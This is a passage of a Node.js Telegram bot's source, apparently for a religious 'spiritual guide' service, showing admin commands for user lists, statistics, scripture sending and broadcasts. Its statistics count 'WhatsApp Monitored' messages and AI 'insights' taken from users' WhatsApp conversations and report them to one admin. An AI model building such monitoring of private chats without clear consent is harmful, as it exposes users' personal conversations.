        userList += `👤 ${user.firstName} (@${user.username})\n`;
        userList += `   ID: ${id}\n`;
        userList += `   Telegram: ${msgCount} msgs\n`;
        userList += `   WhatsApp: ${waStatus}`;
        if (user.whatsappConnected) {
            userList += ` (${waMessages} msgs, ${insights} insights)`;
        }
        userList += `\n   Joined: ${new Date(user.joinedAt).toLocaleDateString()}\n\n`;
    }

    if (Object.keys(users.users).length === 0) {
        userList += `No users yet.`;
    }

    await bot.sendMessage(ADMIN_ID, userList, { parse_mode: 'Markdown' });
});

bot.onText(/\/stats/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    const users = await loadData(USERS_FILE, { users: {} });
    const whatsappData = await loadData(WHATSAPP_DATA_FILE, { conversations: {} });

    const totalUsers = Object.keys(users.users).length;
    const connectedUsers = Object.values(users.users).filter(u => u.whatsappConnected).length;
    const totalTelegramMsgs = Object.values(users.users)
        .reduce((s, u) => s + (u.conversationHistory ? u.conversationHistory.length : 0), 0);
    const totalWhatsAppMsgs = Object.values(whatsappData.conversations)
        .reduce((s, c) => s + (c.messages ? c.messages.length : 0), 0);
    const totalInsights = Object.values(users.users)
        .reduce((s, u) => s + (u.whatsappInsights ? u.whatsappInsights.length : 0), 0);

    const stats = `📊 *DETAILED STATISTICS*\n\n` +
        `*Users:*\n` +
        `Total: ${totalUsers}\n` +
        `WhatsApp Connected: ${connectedUsers}\n\n` +
        `*Messages:*\n` +
        `Telegram: ${totalTelegramMsgs}\n` +
        `WhatsApp Monitored: ${totalWhatsAppMsgs}\n\n` +
        `*AI Intelligence:*\n` +
        `Insights Generated: ${totalInsights}\n\n` +
        `*System:*\n` +
        `Uptime: Since ${new Date().toLocaleDateString()}\n` +
        `Status: ✅ Operational`;

    await bot.sendMessage(ADMIN_ID, stats, { parse_mode: 'Markdown' });
});

bot.onText(/\/sendscripture/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    await bot.sendMessage(ADMIN_ID, '📖 Sending personalized scriptures...');
    await checkUsersAndSendScriptures();
    await bot.sendMessage(ADMIN_ID, '✅ Done!');
});

bot.onText(/\/fixdata/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    const users = await loadData(USERS_FILE, { users: {} });
    let fixed = 0;

    for (const userId in users.users) {
        let userFixed = false;
        
        if (!users.users[userId].conversationHistory) {
            users.users[userId].conversationHistory = [];
            userFixed = true;
        }
        if (typeof users.users[userId].messageCount === 'undefined') {
            users.users[userId].messageCount = 0;
            userFixed = true;
        }
        if (typeof users.users[userId].whatsappConnected === 'undefined') {
            users.users[userId].whatsappConnected = false;
            userFixed = true;
        }
        if (userFixed) fixed++;
    }

    await saveData(USERS_FILE, users);
    await bot.sendMessage(ADMIN_ID, `✅ Fixed ${fixed} records!`);
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;

    const message = match[1];
    const users = await loadData(USERS_FILE, { users: {} });
    
    let sent = 0;
    let failed = 0;

    for (const userId in users.users) {
        try {
            await bot.sendMessage(userId, `📢 *Message from Ensign of God's Glory*\n\n${message}`, { parse_mode: 'Markdown' });
            sent++;
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (error) {
            failed++;
        }
    }

    await bot.sendMessage(ADMIN_ID, 
        `📢 *Broadcast Complete*\n\n✅ Sent: ${sent}\n❌ Failed: ${failed}`,
        { parse_mode: 'Markdown' }
    );
});

// Error handling
bot.on('polling_error', (error) => {
    console.error('Polling error:', error.message);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});
// Start
console.log('🚀 Starting Ensign of God\'s Glory Bot...\n');
console.log('👑 Admin: Chinonso (@Techpro08)');
console.log('📱 Telegram: Active');
console.log('🤖 AI: Spiritual Guide Mode');
console.log('🔑 New API Key Loaded');
console.log('📊 WhatsApp: Initializing...');
console.log('📖 Morning Scriptures: Scheduled (7 AM)\n');

initWhatsApp();
scheduleMorningScriptures();

console.log('✅ Bot is running!\n');          
